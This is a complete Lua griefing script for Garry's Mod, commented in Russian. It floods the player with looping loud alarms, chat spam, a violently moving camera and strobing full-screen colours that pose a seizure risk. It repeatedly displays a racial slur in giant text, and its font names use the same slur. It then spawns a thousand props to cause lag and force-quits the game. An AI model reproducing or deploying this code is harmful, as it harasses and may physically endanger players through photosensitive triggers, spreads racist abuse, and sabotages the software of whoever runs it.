-- Мега громкие звуки
local loudSounds = {
    "ambient/alarms/klaxon1.wav",
    "ambient/alarms/alarm_citizen_loop1.wav", 
    "ambient/alarms/doomsday_lift_alarm.wav",
    "ambient/alarms/apc_alarm_loop1.wav",
    "buttons/button10.wav",
    "buttons/button11.wav",
    "common/bugreporter_failed.wav",
    "common/stuck1.wav",
    "common/stuck2.wav",
    "common/warning.wav"
}

-- Бесконечные звуки
for i = 1, 20 do
    timer.Simple(i * 0.1, function()
        surface.PlaySound(loudSounds[math.random(1, #loudSounds)])
    end)
end

-- Бешеный спам в чат
timer.Create("ChatSpam", 0.05, 0, function()
    RunConsoleCommand("say", "CRASH " .. math.random(1000, 9999))
end)

-- Ярко-красное небо
hook.Add("Think", "BloodRedSky", function()
    RunConsoleCommand("sv_skyname", "sky_borealis01")
    RunConsoleCommand("sv_skyname", "sky_day01_01")
end)

-- Убираем руки
hook.Add("PreDrawPlayerHands", "NoHands", function()
    return true
end)

-- Бешеная камера
hook.Add("CalcView", "CrazyCamera", function(ply, pos, angles, fov)
    local view = {}
    view.origin = pos + Vector(math.sin(CurTime() * 10) * 50, math.cos(CurTime() * 8) * 50, math.sin(CurTime() * 5) * 30)
    view.angles = angles + Angle(math.sin(CurTime() * 5) * 30, math.cos(CurTime() * 7) * 40, math.sin(CurTime() * 3) * 20)
    view.fov = fov + math.sin(CurTime() * 3) * 30
    return view
end)

-- Радужный мир
hook.Add("PreDrawEffects", "RainbowWorld", function()
    render.SetColorModulation(math.sin(CurTime() * 2) * 0.5 + 0.5, math.cos(CurTime() * 3) * 0.5 + 0.5, math.sin(CurTime() * 4) * 0.5 + 0.5)
end)

-- Создаем огромные шрифты для надписей
surface.CreateFont("NiggerHuge", {
    font = "Arial",
    size = 120,
    weight = 2000,
    antialias = false
})

surface.CreateFont("NiggerLarge", {
    font = "Arial",
    size = 80,
    weight = 2000,
    antialias = false
})

-- Эпилептический экран с надписями NIGGER
hook.Add("HUDPaint", "EpilepsyScreen", function()
    local r = math.sin(CurTime() * 10) * 127 + 128
    local g = math.sin(CurTime() * 10 + 2) * 127 + 128
    local b = math.sin(CurTime() * 10 + 4) * 127 + 128
    
    surface.SetDrawColor(r, g, b, 255)
    surface.DrawRect(0, 0, ScrW(), ScrH())
    
    -- Три огромные надписи NIGGER
    draw.SimpleText("NIGGER", "NiggerHuge", ScrW()/2, ScrH()/4, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    draw.SimpleText("NIGGER", "NiggerLarge", ScrW()/4, ScrH()/2, Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    draw.SimpleText("NIGGER", "NiggerLarge", ScrW()*3/4, ScrH()*3/4, Color(255, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    
    -- Дополнительные летающие надписи
    draw.SimpleText("РАДУГА", "DermaLarge", math.sin(CurTime() * 5) * ScrW()/2 + ScrW()/2, math.cos(CurTime() * 4) * ScrH()/2 + ScrH()/2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    draw.SimpleText("ТРЕШ", "DermaLarge", math.cos(CurTime() * 3) * ScrW()/2 + ScrW()/2, math.sin(CurTime() * 2) * ScrH()/2 + ScrH()/2, Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end)

-- Убираем ВЕСЬ интерфейс
hook.Add("HUDShouldDraw", "DestroyHUD", function()
    return false
end)

-- Тряска игрока
timer.Create("ShakePlayer", 0.1, 0, function()
    LocalPlayer():SetPos(LocalPlayer():GetPos() + Vector(math.random(-10, 10), math.random(-10, 10), math.random(-5, 5)))
end)

-- Радужные эффекты пост-обработки
hook.Add("RenderScreenspaceEffects", "RainbowEffects", function()
    local tab = {}
    tab[ "$pp_colour_addr" ] = math.sin(CurTime() * 3) * 0.3
    tab[ "$pp_colour_addg" ] = math.cos(CurTime() * 4) * 0.3
    tab[ "$pp_colour_addb" ] = math.sin(CurTime() * 5) * 0.3
    tab[ "$pp_colour_brightness" ] = math.sin(CurTime() * 2) * 0.2
    tab[ "$pp_colour_contrast" ] = 1 + math.sin(CurTime() * 6) * 0.5
    tab[ "$pp_colour_colour" ] = 2 + math.cos(CurTime() * 7)
    tab[ "$pp_colour_mulr" ] = 0
    tab[ "$pp_colour_mulg" ] = 0
    tab[ "$pp_colour_mulb" ] = 0
    DrawColorModify(tab)
    
    DrawMotionBlur(0.2 + math.sin(CurTime() * 8) * 0.1, 1, 0)
end)

-- Создаем лаг через 5 секунд
timer.Simple(5, function()
    -- Спам объектами
    for i = 1, 1000 do
        timer.Simple(i * 0.001, function()
            local ent = ents.Create("prop_physics")
            if IsValid(ent) then
                ent:SetModel("models/props_junk/TrashDumpster02.mdl")
                ent:SetPos(Vector(math.random(-5000, 5000), math.random(-5000, 5000), math.random(0, 5000)))
                ent:Spawn()
            end
        end)
    end
    
    -- Принудительное закрытие
    timer.Simple(3, function()
        for i = 1, 50 do
            RunConsoleCommand("quit")
            RunConsoleCommand("exit")
        end
    end)
end)

-- Дополнительные звуки
timer.Create("MoreSounds", 0.2, 0, function()
    surface.PlaySound(loudSounds[math.random(1, #loudSounds)])
end)

print("ULTIMATE NIGGER CHAOS ACTIVATED!")
